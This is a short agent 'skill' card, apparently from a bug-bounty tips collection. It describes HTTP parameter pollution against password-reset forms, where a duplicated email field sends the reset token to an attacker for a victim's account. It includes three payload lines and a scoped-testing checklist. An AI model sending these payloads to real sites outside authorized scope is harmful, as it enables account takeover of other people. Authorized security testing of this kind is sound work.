# SKILL: Password Reset HPP (double email parameter)

**Skill id:** `tip/password-reset-hpp-double-email-parameter`  
**Category:** Password Reset, Auth Bypass  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/402dac31e880814bb380cd3457accd26  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Password Reset, Auth Bypass**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

ابعت email=victim&email=attacker أو email\[\]=... لو التوكن بيروح للـ attacker بس صالح للـ victim → ATO.

## Payload / Code

```
[email=victim@x.com](mailto:email=victim@x.com)&[email=attacker@x.com](mailto:email=attacker@x.com)
email\[\]=[victim@x.com](mailto:victim@x.com)&email\[\]=[attacker@x.com](mailto:attacker@x.com)
\{"email":\["victim","attacker"\]\}
```

## Source

Complete Password Reset Checklist 2026

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
